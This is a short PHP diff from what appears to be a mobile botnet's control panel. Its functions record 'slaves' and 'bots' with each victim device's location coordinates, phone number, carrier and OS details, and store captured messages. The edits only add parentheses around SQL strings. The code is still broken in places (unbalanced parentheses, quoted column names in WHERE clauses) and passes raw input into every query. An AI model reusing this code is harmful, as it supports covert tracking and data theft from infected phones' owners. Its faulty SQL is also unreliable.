@@ -50,7 +50,7 @@ function setFunction($UID, $Function){
 
 			$functions = $functions . ", " . $Function;
 
-			$statement="UPDATE slaves SET Function='$functions' WHERE 'Unique_ID' = '$UID'") or die('La consulta fallo: ' . pg_last_error());
+			$statement=("UPDATE slaves SET Function='$functions' WHERE 'Unique_ID' = '$UID'") or die('La consulta fallo: ' . pg_last_error());
 			$statement1=pg_query($statement) or die('La consulta fallo: ' . pg_last_error());
 
 		}
@@ -67,7 +67,7 @@ function updateSlave($UID, $Device, $Version, $Coordinates, $Provider, $PhoneNum
   global $connect;
   
   if (slave_exists($UID)){
-	$statement = "UPDATE bots SET device='$Device', version='$Version', lati='$Lati', longi='$Longi', provider='$Provider', phone='$PhoneNumber', sdk='$SDK', random='$Random' WHERE 'uid' = '$UID'";
+	$statement = ("UPDATE bots SET device='$Device', version='$Version', lati='$Lati', longi='$Longi', provider='$Provider', phone='$PhoneNumber', sdk='$SDK', random='$Random' WHERE 'uid' = '$UID'";
 	$statement1=pg_query($statement) or die('La consulta fallo: ' . pg_last_error());
 
 
@@ -84,7 +84,7 @@ function updateSlave($UID, $Device, $Version, $Coordinates, $Provider, $PhoneNum
 
 function addMessage($UID, $Message) {
   global $connect;
-  $statement = "INSERT INTO 'messages' ('uid', 'message') VALUES ('$UID', '$Message')");
+  $statement = ("INSERT INTO 'messages' ('uid', 'message') VALUES ('$UID', '$Message')");
   $statement1=pg_query($statement) or die('La consulta fallo: ' . pg_last_error());
 }
 
